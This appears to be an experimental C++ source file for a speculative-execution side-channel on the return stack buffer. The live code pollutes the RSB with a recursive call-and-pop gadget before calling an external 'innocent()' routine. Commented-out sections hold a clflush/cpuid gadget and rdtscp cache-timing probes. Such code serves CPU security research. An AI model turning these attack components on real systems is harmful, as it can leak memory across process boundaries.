#include "util.hpp"
#include <iostream>
#include <fstream>

using namespace std;

char array[256*256];

// char array[256*256];

// volatile int foo(){
// 	return 0;
// }

// volatile int goo(){
// 	__asm__(
// 		".rept 564;"
// 		"nop;"
// 		".endr;"
// 	);
// }

// volatile void gadget(){
// 	__asm__(
// 	"pop %rdi;"
// 	"pop %rdi;"	
// 	"pop %rdi;"
// 	"pop %rdi;"
// 	"nop;"
// 	"pop %rbp;"
// 	"clflush (%rsp);"
// 	"clflush (%rip);"
// 	"cpuid;"
// 	"retq;");
// }

// int speculative(){
// 	gadget();
// 	int paceholder = 0;
// 	return 0;
// }

volatile void spacer() {
	asm(
		".rept 2202;"
		"nop;"
		".endr;"
	);
}

void gadget() {
	asm(
		"lbl:"
		"pop %rax;"
		"call lbl;"
	);
}

int main(int argc, char *argv[]){
	if (argc > 1) {
		printf("doing nothing\n");
		while(1) {}
	}
	printf("polluting rsb\n");
	gadget();
	innocent();

	// string buffer;
	// char temp;
	// volatile int i = 0;

	// temp &= array[0];
	// temp &= array[80];
	// temp &= array[200];

	// speculative();

	// unsigned int dummy;
	// auto t1 = __rdtscp(&dummy);
	// temp &= array[0];
	// auto t2 = __rdtscp(&dummy);
	// cout<<t2-t1<<endl;

	// auto t3 = __rdtscp(&dummy);
	// temp &= array[80];
	// auto t4 = __rdtscp(&dummy);
	// cout<<t4-t3<<endl;

	// auto t5 = __rdtscp(&dummy);
	// temp &= array[200];
	// auto t6 = __rdtscp(&dummy);
	// cout<<t6-t5<<endl;

	// return 0;
}